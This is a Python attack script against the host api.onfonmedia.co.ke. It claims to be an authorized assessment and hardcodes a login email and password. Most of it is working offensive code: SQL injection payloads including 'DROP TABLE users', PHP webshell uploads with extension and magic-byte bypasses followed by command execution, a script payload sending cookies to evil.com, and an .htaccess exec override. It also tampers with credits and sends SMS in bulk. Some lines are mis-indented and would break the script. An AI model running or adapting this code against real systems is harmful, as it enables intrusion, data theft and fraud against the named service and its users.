#!/usr/bin/env python3
"""
OneFone / api.onfonmedia.co.ke — Authorized Security Assessment
Engagement: Cyberdeck Consultants | LOA Ref: api.onfonmedia.co.ke/CTO/LOA/2026/012
Run: python3 sweep.py
"""

import requests
import json
import time
import re
import sys
import os
from datetime import datetime
from urllib.parse import urljoin, urlparse, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed

# ─── CONFIG ─────────────────────────────────────────────────────────────────────────────────
TARGET     = "https://api.onfonmedia.co.ke"
EMAIL      = "cm4anonymous@gmail.com"
PASSWORD   = "Mwasin254.$"
TIMEOUT    = 15
REPORT_OUT = "onefone_report.html"

SESSION    = requests.Session()
SESSION.headers.update({
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
    "Accept": "application/json, text/html, */*",
    "Accept-Language": "en-US,en;q=0.9",
})

FINDINGS = []
RECON    = {}

# ─── HELPERS ──────────────────────────────────────────────────────────────────────────────────
def url(path):
    return urljoin(TARGET, path)

def log(tag, msg, color="\033[0m"):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"{color}[{ts}] [{tag}]\033[0m {msg}")

def ok(msg):   log("OK",   msg, "\033[92m")
def warn(msg): log("WARN", msg, "\033[93m")
def crit(msg): log("CRIT", msg, "\033[91m")
def info(msg): log("INFO", msg, "\033[94m")

def finding(severity, title, detail, evidence=""):
    FINDINGS.append({
        "severity": severity, "title": title,
        "detail": detail, "evidence": evidence,
        "time": datetime.now().isoformat()
    })
    color = {"CRITICAL":"\033[91m","HIGH":"\033[91m","MEDIUM":"\033[93m","LOW":"\033[94m","INFO":"\033[96m"}.get(severity, "")
    crit(f"[{severity}] {title}") if severity in ("CRITICAL","HIGH") else warn(f"[{severity}] {title}")

def safe_get(path, **kw):
    try:
        r = SESSION.get(url(path), timeout=TIMEOUT, allow_redirects=True, **kw)
        return r
    except Exception as e:
        return None

def safe_post(path, **kw):
    try:
        r = SESSION.post(url(path), timeout=TIMEOUT, allow_redirects=True, **kw)
        return r
    except Exception as e:
        return None

# ─── PHASE 1: RECON ───────────────────────────────────────────────────────────────────────────────────
def phase_recon():
    info("=" * 60)
    info("PHASE 1 — RECONNAISSANCE")
    info("=" * 60)

    # Headers fingerprint
    r = safe_get("/")
    if r:
        RECON["status_root"] = r.status_code
        RECON["headers"] = dict(r.headers)
        info(f"Root → HTTP {r.status_code}")
        for h in ["Server","X-Powered-By","X-Frame-Options","Content-Security-Policy",
                  "Strict-Transport-Security","X-Content-Type-Options","Access-Control-Allow-Origin"]:
            v = r.headers.get(h)
            if v:
                info(f"  {h}: {v}")
            else:
                warn(f"  {h}: MISSING")
                if h in ("X-Frame-Options","X-Content-Type-Options","Strict-Transport-Security"):
                    finding("MEDIUM", f"Missing security header: {h}",
                            f"The {h} header is absent, increasing exposure to common browser attacks.",
                            f"GET / → headers: {dict(r.headers)}")

        # Check cookies
        if r.cookies:
            for c in r.cookies:
                issues = []
                if not c.secure:   issues.append("Secure flag missing")
                if not c.has_nonstandard_attr("HttpOnly"): issues.append("HttpOnly missing")
                if not c.has_nonstandard_attr("SameSite"): issues.append("SameSite missing")
                if issues:
                    finding("MEDIUM", f"Cookie misconfiguration: {c.name}",
                            f"Cookie '{c.name}' is missing: {', '.join(issues)}", str(c))

        # CSP analysis
        csp = r.headers.get("Content-Security-Policy","")
        if not csp:
            finding("MEDIUM","No Content-Security-Policy header",
                    "Absence of CSP increases XSS risk.")
        elif "unsafe-inline" in csp or "unsafe-eval" in csp:
            finding("MEDIUM","Weak CSP — unsafe-inline or unsafe-eval present",
                    f"CSP value: {csp}")

        # CORS
        origin_test = SESSION.get(url("/"), headers={"Origin":"https://evil.com"}, timeout=TIMEOUT)
        acao = origin_test.headers.get("Access-Control-Allow-Origin","")
        if acao == "*" or acao == "https://evil.com":
            finding("HIGH","Wildcard or reflected CORS",
                    f"Server reflects arbitrary Origin. ACAO: {acao}",
                    f"Request Origin: evil.com → Response ACAO: {acao}")

    # Sensitive file probes
    sensitive = [
        "/.env", "/.env.local", "/.env.backup", "/.env.production",
        "/.git/HEAD", "/.git/config", "/.git/COMMIT_EDITMSG",
        "/phpinfo.php", "/info.php", "/test.php", "/debug.php",
        "/config.json", "/config.php", "/.DS_Store",
        "/package.json", "/package-lock.json", "/composer.json",
        "/wp-config.php", "/database.yml", "/secrets.yml",
        "/storage/logs/laravel.log", "/logs/error.log",
        "/.htaccess", "/web.config", "/server.xml",
        "/api/swagger.json", "/api/openapi.json", "/swagger.json",
        "/swagger-ui.html", "/api-docs", "/openapi.yaml",
    ]
    info(f"Probing {len(sensitive)} sensitive paths...")
    for path in sensitive:
        r = safe_get(path)
        if r is None:
            continue
        if r.status_code == 200:
            body = r.text[:500]
            if any(kw in body.lower() for kw in ["db_","database","password","secret","key","api_key","token","mysql","redis"]):
                finding("CRITICAL", f"Sensitive file exposed: {path}",
                        f"HTTP 200 with credential-like content.", body)
            else:
                finding("HIGH", f"File accessible: {path}",
                        f"HTTP 200 returned for sensitive path.", body[:200])
            crit(f"  {path} → 200 EXPOSED")
        elif r.status_code == 403:
            warn(f"  {path} → 403 (may exist, blocked by server)")
            RECON.setdefault("403_paths", []).append(path)
        elif r.status_code == 404:
            pass  # expected
        else:
            info(f"  {path} → {r.status_code}")

    # Directory traversal common paths
    dirs = [
        "/admin", "/administrator", "/phpmyadmin", "/pma",
        "/horizon", "/telescope", "/nova", "/pulse",
        "/backup", "/backups", "/dumps", "/exports",
        "/uploads", "/upload", "/files", "/storage/app/public",
        "/public/uploads", "/assets", "/static",
        "/api/v1", "/api/v2", "/api/v3",
        "/dashboard", "/dashboard/settings",
        "/user", "/users", "/account", "/accounts",
        "/sms", "/messages", "/contacts", "/campaigns",
        "/reports", "/analytics", "/billing", "/payments",
    ]
    info(f"Mapping {len(dirs)} common paths...")
    RECON["accessible"] = []
    for path in dirs:
        r = safe_get(path)
        if r and r.status_code not in (404,):
            RECON["accessible"].append({"path": path, "status": r.status_code, "len": len(r.text)})
            info(f"  {path} → {r.status_code} ({len(r.text)} bytes)")

    ok("Phase 1 complete.")

# ─── PHASE 2: AUTHENTICATION ────────────────────────────────────────────────────────────────────────────────
def phase_auth():
    info("=" * 60)
    info("PHASE 2 — AUTHENTICATION & SESSION ANALYSIS")
    info("=" * 60)

    login_paths = [
        ("/api/auth/login",     {"email": EMAIL, "password": PASSWORD}),
        ("/api/login",          {"email": EMAIL, "password": PASSWORD}),
        ("/api/v1/auth/login",  {"email": EMAIL, "password": PASSWORD}),
        ("/api/v1/login",       {"email": EMAIL, "password": PASSWORD}),
        ("/login",              {"email": EMAIL, "password": PASSWORD}),
        ("/auth/login",         {"email": EMAIL, "password": PASSWORD}),
        ("/api/auth/login",     {"username": EMAIL, "password": PASSWORD}),
        ("/api/user/login",     {"email": EMAIL, "password": PASSWORD}),
        ("/api/signin",         {"email": EMAIL, "password": PASSWORD}),
    ]

    authenticated = False
    for path, payload in login_paths:
        # Try JSON
        r = safe_post(path, json=payload,
                      headers={"Content-Type": "application/json"})
        if r and r.status_code in (200, 201):
            try:
                data = r.json()
                token = (data.get("token") or data.get("access_token") or
                         data.get("data", {}).get("token") or
                         data.get("data", {}).get("access_token"))
                if token:
                    SESSION.headers["Authorization"] = f"Bearer {token}"
                    RECON["auth_token"] = token
                    RECON["auth_path"]  = path
                    ok(f"Authenticated via {path} — token: {token[:40]}...")
                    authenticated = True

                    # Session analysis
                    if not data.get("csrf") and "csrf" not in str(r.headers).lower():
                        finding("LOW","No CSRF token in auth response",
                                "Auth endpoint returns token but no CSRF protection mentioned.")

                    # Check token expiry
                    if "expires_in" in data:
                        info(f"  Token expires in: {data['expires_in']}s")
                    break
                else:
                    ok(f"  {path} → 200 but no token in response: {str(data)[:200]}")
            except:
                ok(f"  {path} → 200 non-JSON: {r.text[:200]}")
                authenticated = True
                break

        elif r and r.status_code == 302:
            info(f"  {path} → redirect to {r.headers.get('Location','?')}")
        elif r and r.status_code not in (404, 405, 422):
            info(f"  {path} → {r.status_code}: {r.text[:150]}")

        # Try form-encoded
        r2 = safe_post(path, data=payload)
        if r2 and r2.status_code in (200, 201, 302):
            if r2.status_code == 302:
                loc = r2.headers.get("Location","")
                if "login" not in loc and "error" not in loc:
                    ok(f"  Form login at {path} → redirect to {loc}")
                    authenticated = True
                    break

    # Test for auth bypass
    info("Testing unauthenticated access to protected endpoints...")
    protected = ["/api/user", "/api/users", "/api/contacts",
                 "/api/sms", "/api/messages", "/api/campaigns",
                 "/api/balance", "/api/wallet", "/api/reports",
                 "/dashboard/settings", "/api/settings"]
    tmp_auth = SESSION.headers.pop("Authorization", None)
    for path in protected:
        r = safe_get(path)
        if r and r.status_code == 200:
            body = r.text
            if len(body) > 100 and "login" not in body.lower():
                finding("CRITICAL","Unauthenticated access to protected endpoint",
                        f"{path} returns data without authentication.",
                        body[:500])
                crit(f"  AUTH BYPASS: {path} → 200 unauthenticated!")
    if tmp_auth:
        SESSION.headers["Authorization"] = tmp_auth

    # Brute force / rate limiting test
    info("Testing login rate-limiting...")
    for i in range(6):
        r = safe_post(list(filter(lambda x: x[0]=="/api/auth/login", login_paths))[0][0] if login_paths else "/api/auth/login",
                      json={"email": EMAIL, "password": "wrongpassword123"})
        if r is None:
            break
        if r.status_code == 429:
            ok(f"  Rate limiting active after {i+1} attempts.")
            break
        if i == 5:
            finding("MEDIUM","No login rate limiting detected",
                    "6 consecutive failed login attempts returned no 429/lockout.",
                    f"Last status: {r.status_code}")

    if not authenticated:
        warn("Could not authenticate — proceeding with unauthenticated tests.")
    else:
        ok("Authentication phase complete.")
    return authenticated

# ─── PHASE 3: AUTHENTICATED SURFACE MAP ───────────────────────────────────────────────────────────────
def phase_surface_map():
    info("=" * 60)
    info("PHASE 3 — AUTHENTICATED SURFACE MAPPING")
    info("=" * 60)

    api_endpoints = [
        "/api/user", "/api/users", "/api/profile",
        "/api/contacts", "/api/contact",
        "/api/sms", "/api/sms/send", "/api/sms/history",
        "/api/messages", "/api/message",
        "/api/campaigns", "/api/campaign",
        "/api/balance", "/api/wallet", "/api/credits",
        "/api/reports", "/api/analytics",
        "/api/settings", "/api/config",
        "/api/billing", "/api/invoices", "/api/payments",
        "/api/api-keys", "/api/tokens",
        "/api/webhooks", "/api/integrations",
        "/api/admin", "/api/admin/users",
        "/api/export", "/api/import",
        "/api/upload", "/api/files",
        "/api/v1/user", "/api/v1/sms", "/api/v1/contacts",
        "/api/v2/user", "/api/v2/sms",
    ]

    found = []
    info(f"Probing {len(api_endpoints)} API endpoints...")
    for path in api_endpoints:
        r = safe_get(path)
        if r and r.status_code not in (404, 405):
            found.append({"path": path, "status": r.status_code,
                          "content_type": r.headers.get("Content-Type",""),
                          "length": len(r.text), "body": r.text[:300]})
            info(f"  {path} → {r.status_code} [{r.headers.get('Content-Type','')}] {len(r.text)}b")
    RECON["api_endpoints"] = found
    ok(f"Found {len(found)} responsive endpoints.")

# ─── PHASE 4: SQL INJECTION ───────────────────────────────────────────────────────────────────────────────────
def phase_sqli():
    info("=" * 60)
    info("PHASE 4 — SQL INJECTION")
    info("=" * 60)

    payloads = [
        "'", '"', "' OR '1'='1", "' OR '1'='1'--",
        "' OR 1=1--", "' OR 1=1#", "'; DROP TABLE users--",
        "1' AND SLEEP(3)--", "1' AND (SELECT 3000 FROM(SELECT(SLEEP(3)))a)--",
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "admin'--", "' OR 'x'='x", "') OR ('x'='x",
        "1 OR 1=1", "1; SELECT * FROM users",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
        "' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--",
    ]

    error_signatures = [
        "sql syntax", "mysql_fetch", "ora-", "odbc driver",
        "microsoft ole db", "sqlite3", "postgresql", "pg_query",
        "syntax error", "unclosed quotation", "sqlstate",
        "you have an error in your sql", "warning: mysql",
        "invalid query", "division by zero",
    ]

    test_params = ["id", "user_id", "contact_id", "campaign_id",
                   "message_id", "phone", "email", "q", "search",
                   "filter", "sort", "order", "page", "limit",
                   "sender_id", "group_id", "report_id"]

    endpoints = ["/api/contacts", "/api/messages", "/api/sms",
                 "/api/users", "/api/campaigns", "/api/reports",
                 "/api/v1/contacts", "/api/v1/messages"]

    info(f"Testing {len(endpoints)} endpoints x {len(test_params)} params x {len(payloads)} payloads...")

    for endpoint in endpoints:
        # baseline
        baseline = safe_get(endpoint)
        if baseline is None:
            continue
        baseline_len = len(baseline.text)

        for param in test_params[:5]:  # top params first
            for payload in payloads:
                # GET param injection
                r = safe_get(f"{endpoint}?{param}={requests.utils.quote(payload)}")
                if r is None:
                    continue
                body_low = r.text.lower()

                # Error-based detection
                if any(sig in body_low for sig in error_signatures):
                    finding("CRITICAL", "SQL Injection — Error-based",
                            f"SQL error returned at {endpoint}?{param}={payload}",
                            r.text[:800])
                    crit(f"  SQLi ERROR: {endpoint}?{param}={payload}")

                # Time-based detection (SLEEP payloads)
                if "SLEEP" in payload or "sleep" in payload:
                    t0 = time.time()
                    r2 = safe_get(f"{endpoint}?{param}={requests.utils.quote(payload)}")
                    elapsed = time.time() - t0
                    if elapsed > 2.5:
                        finding("CRITICAL","SQL Injection — Time-based blind",
                                f"Response delayed {elapsed:.1f}s at {endpoint}?{param}={payload}",
                                f"Elapsed: {elapsed:.2f}s")
                        crit(f"  SQLi TIME-BASED: {endpoint}?{param}={payload} ({elapsed:.1f}s)")

                # Union-based: abnormal length change
                if "UNION" in payload and abs(len(r.text) - baseline_len) > 200:
                    finding("HIGH","Potential UNION-based SQL Injection",
                            f"Response length changed significantly at {endpoint}?{param}={payload}",
                            f"Baseline: {baseline_len}b | Injected: {len(r.text)}b\n{r.text[:400]}")

    # POST body injection via login and other forms
    post_targets = [
        ("/api/auth/login",  "email"),
        ("/api/contacts",    "phone"),
        ("/api/sms/send",    "message"),
    ]
    for path, field in post_targets:
        for payload in payloads[:5]:
            r = safe_post(path, json={field: payload, "password": "test"})
            if r and any(sig in r.text.lower() for sig in error_signatures):
                finding("CRITICAL","SQL Injection in POST body",
                        f"SQL error at POST {path} field '{field}'", r.text[:800])

    ok("SQL injection phase complete.")

# ─── PHASE 5: FILE UPLOAD ───────────────────────────────────────────────────────────────────────────────────
def _try_exec(upload_path, fname, endpoint, body):
    """Attempt RCE on a successfully uploaded PHP file."""
    for cmd_path in [upload_path, "/" + upload_path.lstrip("/")]:
        shell_r = safe_get(f"{cmd_path}?cmd=id")
        if shell_r and ("uid=" in shell_r.text or "root" in shell_r.text or "www-data" in shell_r.text):
            finding("CRITICAL", "Remote Code Execution — Webshell Executed",
                    f"Shell at {TARGET}{cmd_path}?cmd=id → {shell_r.text[:200]}",
                    shell_r.text[:500])
            crit(f"  RCE CONFIRMED: {TARGET}{cmd_path}")
            return True
    return False

def _record_upload(status, fname, endpoint, body, desc):
    """Classify an upload response and log a finding."""
    paths = re.findall(
        r'["\']([^"\']*(?:upload|file|storage|public|media|avatar|img)[^"\']*\.[a-z0-9]{1,6})["\']',
        body, re.IGNORECASE)
    url_paths = re.findall(
        r'https?://[^\s\'"<>]+(?:upload|file|storage|public|media|avatar|img)[^\s\'"<>]+',
        body, re.IGNORECASE)
    found_path = (paths or url_paths or [None])[0]

    if found_path:
        finding("CRITICAL", f"File upload succeeded: {fname}",
                f"{desc}\nEndpoint: {endpoint}\nServer path: {found_path}",
                body[:600])
        crit(f"  UPLOAD SUCCESS: {fname} → {found_path}")
        return found_path
    else:
        finding("HIGH", f"File upload returned {status}: {fname}",
                f"{desc}\nEndpoint: {endpoint}\nResponse (no path found): {body[:300]}",
                body[:600])
        warn(f"  UPLOAD {status}: {fname} (no path in response)")
        return None

def phase_file_upload():
    info("=" * 60)
    info("PHASE 5 — FILE UPLOAD VULNERABILITIES")
    info("=" * 60)

    upload_endpoints = [
        "/dashboard/settings",
        "/api/upload",
        "/api/files",
        "/api/profile",
        "/api/profile/avatar",
        "/api/user/avatar",
        "/api/user/photo",
        "/api/settings",
        "/api/settings/logo",
        "/api/import",
        "/api/contacts/import",
        "/api/sms/import",
        "/upload",
        "/uploads",
    ]

    # ── Payloads ────────────────────────────────────────────────────────────────────────────
PHP_SHELL    = b"<?php system($_GET['cmd']); ?>"
    PHP_INFO     = b"<?php phpinfo(); ?>"
    # GIF header + PHP -- passes magic byte validation
    GIF_PHP      = b"GIF89a\n<?php system($_GET['cmd']); ?>"
    # PNG magic bytes + PHP
    PNG_PHP      = b"\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>"
    # JPEG magic bytes + PHP (EXIF-style polyglot)
    JPG_PHP      = b"\xff\xd8\xff\xe0" + b"\x00" * 12 + b"<?php system($_GET['cmd']); ?>"
    JS_XSS       = b"<script>fetch('https://evil.com/?c='+document.cookie)</script>"
    SVG_XSS      = (b'<?xml version="1.0"?>'
                    b'<svg xmlns="http://www.w3.org/2000/svg">'
                    b'<script>alert(document.cookie)</script></svg>')
    HTML_XSS     = b"<html><body><script>alert(document.domain)</script></body></html>"
    HTACCESS      = b"AddType application/x-httpd-php .jpg .png .gif\nOptions +ExecCGI"
    CSV_INJECT    = b'id,name,phone\n1,=cmd|"/C calc"!A0,+254700000000'

    test_files = [
        # ── Direct PHP ──────────────────────────────────────────────────────────────
        ("shell.php",       PHP_SHELL, "application/x-php",          "Direct PHP webshell"),
        ("shell.PHP",       PHP_SHELL, "application/x-php",          "Uppercase .PHP bypass"),
        ("shell.phtml",     PHP_SHELL, "application/x-php",          ".phtml bypass"),
        ("shell.php5",      PHP_SHELL, "application/x-php",          ".php5 bypass"),
        ("shell.php7",      PHP_SHELL, "application/x-php",          ".php7 bypass"),
        ("shell.phar",      PHP_SHELL, "application/octet-stream",   ".phar bypass"),
        ("shell.shtml",     PHP_SHELL, "text/html",                  ".shtml SSI bypass"),
        # ── Double/Triple extension ─────────────────────────────────────────────────────────
        ("shell.php.jpg",   PHP_SHELL, "image/jpeg",                 "Double ext .php.jpg"),
        ("shell.jpg.php",   PHP_SHELL, "image/jpeg",                 "Double ext .jpg.php"),
        ("shell.php.png",   PHP_SHELL, "image/png",                  "Double ext .php.png"),
        ("shell.php.gif",   PHP_SHELL, "image/gif",                  "Double ext .php.gif"),
        ("shell.php.txt",   PHP_SHELL, "text/plain",                 "Double ext .php.txt"),
        # ── Magic bytes polyglot ─────────────────────────────────────────────────────────────────
        ("shell.gif",       GIF_PHP,   "image/gif",                  "GIF magic bytes + PHP polyglot"),
        ("shell.png",       PNG_PHP,   "image/png",                  "PNG magic bytes + PHP polyglot"),
        ("shell.jpg",       JPG_PHP,   "image/jpeg",                 "JPEG magic bytes + PHP polyglot"),
        # ── Null byte ──────────────────────────────────────────────────────────────────────────
        ("shell.php\x00.jpg", PHP_SHELL, "image/jpeg",               "Null byte truncation"),
        # ── Path traversal in filename ──────────────────────────────────────────────────────────────
        ("../shell.php",    PHP_SHELL, "application/x-php",          "Path traversal ../"),
        ("../../shell.php", PHP_SHELL, "application/x-php",          "Path traversal ../../"),
        ("....//shell.php", PHP_SHELL, "application/x-php",          "Traversal ..// variant"),
        # ── .htaccess injection ─────────────────────────────────────────────────────────────────
        (".htaccess",       HTACCESS,  "application/octet-stream",   ".htaccess → exec jpg as php"),
        # ── XSS via upload ───────────────────────────────────────────────────────────────────
        ("xss.svg",         SVG_XSS,  "image/svg+xml",               "SVG XSS"),
        ("xss.html",        HTML_XSS, "text/html",                   "HTML upload XSS"),
        # ── CSV injection ────────────────────────────────────────────────────────────────────
        ("contacts.csv",    CSV_INJECT, "text/csv",                  "CSV formula injection"),
        # ── Large upload to test size limits ────────────────────────────────────────────────
        ("big.txt",         b"A" * 50_000_000, "text/plain",         "50 MB upload size limit test"),
    ]

    # Field names the server might use for the upload input
    field_names = ["file", "image", "avatar", "photo", "attachment",
                   "document", "upload", "logo", "picture", "profile_picture",
                   "profile_image", "import", "csv"]

    success_count = 0

    for endpoint in upload_endpoints:
        info(f"\n  Probing endpoint: {endpoint}")

        # First check if endpoint exists at all
        probe = safe_get(endpoint)
        if probe and probe.status_code == 404:
            info(f"    → 404, skipping")
            continue

        for fname, content, ctype, desc in test_files:
            # Skip 50 MB test on most endpoints -- only run on settings
            if len(content) > 1_000_000 and endpoint != "/dashboard/settings":
                continue

            for field in field_names:
                try:
                    files = {field: (fname, content, ctype)}
                    r = SESSION.post(url(endpoint), files=files,
                                    timeout=TIMEOUT)
                    if r is None:
                        continue
                    body  = r.text
                    code  = r.status_code

                    if code in (200, 201):
                        up_path = _record_upload(code, fname, endpoint, body, desc)
                        if up_path:
                            success_count += 1
                            if any(x in fname for x in (".php", ".phtml", ".phar",
                                                         ".php5", ".php7", ".shtml")):
                                _try_exec(up_path, fname, endpoint, body)
                            elif fname in ("shell.gif", "shell.png", "shell.jpg"):
                                # Polyglot -- try execution if served from upload dir
                                _try_exec(up_path, fname, endpoint, body)
                        break  # field found -- no need to try others for this file

                    elif code == 413:
                        if len(content) > 1_000_000:
                            finding("INFO", f"Upload size limit enforced at {endpoint}",
                                    f"413 returned for {len(content)//1_000_000}MB file.",
                                    f"POST {endpoint} → 413")
                        break

                except Exception:
                    pass

    # ── Settings page multipart deep probe ─────────────────────────────────────────────────────────
info("\n  Deep probe -- /dashboard/settings multipart form fields...")
    settings_form_fields = [
        ("profile_picture", "avatar.php", PHP_SHELL, "application/x-php"),
        ("company_logo",    "logo.php",   PHP_SHELL, "application/x-php"),
        ("logo",            "logo.php",   PHP_SHELL, "application/x-php"),
        ("favicon",         "fav.php",    PHP_SHELL, "application/x-php"),
        ("banner",          "banner.php", PHP_SHELL, "application/x-php"),
        ("cover",           "cover.php",  PHP_SHELL, "application/x-php"),
        ("photo",           "photo.php",  PHP_SHELL, "application/x-php"),
        ("file",            "file.php",   PHP_SHELL, "application/x-php"),
    ]
    # Send text fields alongside to simulate a real form submit
    form_data = {"_method": "PUT", "_token": ""}
    for field, fname, content, ctype in settings_form_fields:
        try:
            r = SESSION.post(url("/dashboard/settings"),
                             data=form_data,
                             files={field: (fname, content, ctype)},
                             timeout=TIMEOUT)
            if r and r.status_code in (200, 201, 302):
                body = r.text
                if r.status_code == 302:
                    loc = r.headers.get("Location","")
                    info(f"    {field}={fname} → 302 → {loc}")
                elif "error" not in body.lower() and "invalid" not in body.lower():
                    _record_upload(r.status_code, fname, "/dashboard/settings", body,
                                   f"Settings form field '{field}'")
        except Exception:
            pass

    # ── Check for stored uploads accessible without auth ──────────────────────────────────────────
info("\n  Checking common upload storage paths for directory listing...")
    storage_paths = [
        "/uploads/", "/upload/", "/files/", "/media/",
        "/storage/", "/storage/app/public/",
        "/public/uploads/", "/public/files/",
        "/assets/uploads/", "/assets/images/",
        "/user-uploads/", "/user_uploads/",
    ]
    for spath in storage_paths:
        r = safe_get(spath)
        if r and r.status_code == 200:
            if any(kw in r.text.lower() for kw in
                   ["index of", "parent directory", ".php", ".phtml"]):
                finding("HIGH", f"Directory listing at {spath}",
                        "Upload directory is browseable -- may expose uploaded files.",
                        r.text[:600])
                warn(f"  DIR LISTING: {spath}")

    info(f"\n  File upload phase complete. {success_count} successful upload(s).")
    ok("File upload phase complete.")

# ─── PHASE 6: IDOR & ACCESS CONTROL ──────────────────────────────────────────────────────────────────────────────
def phase_idor():
    info("=" * 60)
    info("PHASE 6 — IDOR & BROKEN ACCESS CONTROL")
    info("=" * 60)

    # Get own user ID first
    own_id = None
    r = safe_get("/api/user")
    if r and r.status_code == 200:
        try:
            data = r.json()
            own_id = data.get("id") or data.get("user_id") or data.get("data",{}).get("id")
            info(f"Own user ID: {own_id}")
        except:
            pass

    # Test sequential ID enumeration
    id_patterns = [
        "/api/users/{id}",
        "/api/contacts/{id}",
        "/api/messages/{id}",
        "/api/campaigns/{id}",
        "/api/invoices/{id}",
        "/api/reports/{id}",
        "/api/payments/{id}",
    ]

    info("Testing IDOR via sequential ID enumeration...")
    for pattern in id_patterns:
        hits = []
        for test_id in range(1, 20):
            if own_id and test_id == own_id:
                continue
            path = pattern.format(id=test_id)
            r = safe_get(path)
            if r and r.status_code == 200 and len(r.text) > 50:
                hits.append(test_id)
                if len(hits) == 1:  # report first hit
                    finding("HIGH", f"IDOR — Access to other users' data",
                            f"Accessed {path} without ownership. Returned {len(r.text)} bytes.",
                            r.text[:500])
                    crit(f"  IDOR: {path} → 200")
        if hits:
            warn(f"  {pattern} — {len(hits)} IDs accessible: {hits[:10]}")

    # Horizontal privilege escalation
    info("Testing horizontal privilege escalation...")
    admin_paths = [
        "/api/admin", "/api/admin/users", "/api/admin/settings",
        "/api/admin/credits", "/api/admin/billing",
        "/admin", "/admin/users", "/admin/dashboard",
    ]
    for path in admin_paths:
        r = safe_get(path)
        if r and r.status_code == 200 and len(r.text) > 100:
            finding("HIGH","Unauthorized admin endpoint access",
                    f"Non-admin account accessed {path}.",
                    r.text[:500])
            crit(f"  PRIV ESC: {path} → 200")

    # Parameter tampering
    info("Testing parameter tampering...")
    tamper_tests = [
        ("/api/sms/send", {"phone": "+1234567890", "message": "test", "credits": -1000}),
        ("/api/sms/send", {"phone": "+1234567890", "message": "test", "sender_id": "ADMIN"}),
        ("/api/balance",  {}),
        ("/api/credits/add", {"amount": 999999, "user_id": 1}),
    ]
    for path, payload in tamper_tests:
        r = safe_post(path, json=payload)
        if r and r.status_code in (200,201):
            try:
                data = r.json()
                if "balance" in str(data) or "credits" in str(data):
                    finding("HIGH","Parameter tampering — potential financial manipulation",
                            f"POST {path} with tampered payload accepted.\nPayload: {payload}",
                            r.text[:500])
            except:
                pass

    ok("IDOR phase complete.")

# ─── PHASE 7: CREDENTIAL & SECRET SCAN ─────────────────────────────────────────────────────────────────────────────
def phase_credentials():
    info("=" * 60)
    info("PHASE 7 — CREDENTIAL & SECRET EXPOSURE")
    info("=" * 60)

    secret_patterns = [
        (r"(?i)(api[_-]?key|apikey)\s*[:=]\s*['\"]?([A-Za-z0-9_\-]{20,})", "API Key"),
        (r"(?i)(secret[_-]?key|secret)\s*[:=]\s*['\"]?([A-Za-z0-9_\-]{20,})", "Secret Key"),
        (r"(?i)(password|passwd|pwd)\s*[:=]\s*['\"]?([^\s'\"]{8,})", "Password"),
        (r"(?i)(db[_-]?password|database[_-]?password)\s*[:=]\s*['\"]?([^\s'\"]{4,})", "DB Password"),
        (r"(?i)(access[_-]?token|bearer)\s*[:=]\s*['\"]?([A-Za-z0-9_\-\.]{20,})", "Access Token"),
        (r"(?i)(private[_-]?key)\s*[:=]\s*['\"]?([^\s'\"]{20,})", "Private Key"),
        (r"sk-[A-Za-z0-9]{40,}", "OpenAI/Stripe Secret Key"),
        (r"AIza[A-Za-z0-9_\-]{35}", "Google API Key"),
        (r"(?i)smtp.*password.*=.*[^\s]{4,}", "SMTP Credential"),
        (r"mysql://[^@]+:[^@]+@", "MySQL Connection String"),
        (r"postgres://[^@]+:[^@]+@", "Postgres Connection String"),
        (r"mongodb://[^@]+:[^@]+@", "MongoDB Connection String"),
        (r"redis://:[^@]+@", "Redis Auth String"),
    ]

    js_paths_to_check = [
        "/_next/static/chunks/main.js",
        "/_next/static/chunks/pages/index.js",
        "/_next/static/chunks/webpack.js",
        "/static/js/main.js",
        "/static/js/bundle.js",
        "/assets/js/app.js",
        "/js/app.js",
        "/app.js",
    ]

    info("Scanning JS bundles for hardcoded secrets...")
    for js_path in js_paths_to_check:
        r = safe_get(js_path)
        if r and r.status_code == 200 and len(r.text) > 100:
            info(f"  Found JS bundle: {js_path} ({len(r.text)} bytes)")
            for pattern, label in secret_patterns:
                matches = re.findall(pattern, r.text)
                if matches:
                    finding("CRITICAL", f"Hardcoded {label} in JS bundle",
                            f"Pattern matched in {js_path}",
                            str(matches[:3]))

    # Check API responses for leaked secrets
    info("Checking API responses for secret leakage...")
    check_endpoints = ["/api/user", "/api/settings", "/api/config",
                       "/api/profile", "/api/integrations", "/api/webhooks"]
    for path in check_endpoints:
        r = safe_get(path)
        if r and r.status_code == 200:
            for pattern, label in secret_patterns:
                matches = re.findall(pattern, r.text)
                if matches:
                    finding("HIGH", f"{label} exposed in API response",
                            f"Pattern matched in response from {path}",
                            str(matches[:3]))

    ok("Credential scan phase complete.")

# ─── PHASE 8: LOGIC FLAWS ──────────────────────────────────────────────────────────────────────────────────
def phase_logic():
    info("=" * 60)
    info("PHASE 8 — BUSINESS LOGIC FLAWS")
    info("=" * 60)

    # Negative credit top-up
    info("Testing negative amount manipulation...")
    r = safe_post("/api/credits/add", json={"amount": -99999})
    if r and r.status_code in (200,201):
        finding("HIGH","Negative credit amount accepted",
                "Server accepted a negative credit top-up amount.", r.text[:300])

    # Free credits via coupon/promo bypass
    r = safe_post("/api/promo/apply", json={"code": "' OR '1'='1"})
    if r and r.status_code in (200,201):
        finding("MEDIUM","Promo code injection accepted", "", r.text[:300])

    # Race condition on SMS send
    info("Testing race condition on credit deduction...")
    import threading
    results = []
    def send_sms():
        r = safe_post("/api/sms/send",
                      json={"phone": "+254700000000", "message": "race test"})
        if r:
            results.append(r.status_code)
    threads = [threading.Thread(target=send_sms) for _ in range(10)]
    for t in threads: t.start()
    for t in threads: t.join()
    successes = results.count(200) + results.count(201)
    if successes > 1:
        finding("HIGH", f"Race condition — {successes} simultaneous SMS sends accepted",
                "Multiple concurrent requests may have caused double credit deduction or free sends.",
                f"Results: {results}")

    # Mass message enumeration (send to many without balance)
    info("Testing mass messaging without sufficient balance...")
    r = safe_post("/api/sms/bulk-send",
                  json={"contacts": ["+254700000001"]*1000,
                        "message": "test"})
    if r and r.status_code in (200,201):
        finding("HIGH","Mass SMS dispatch without balance validation",
                "Bulk send endpoint accepted 1000 recipients.", r.text[:300])

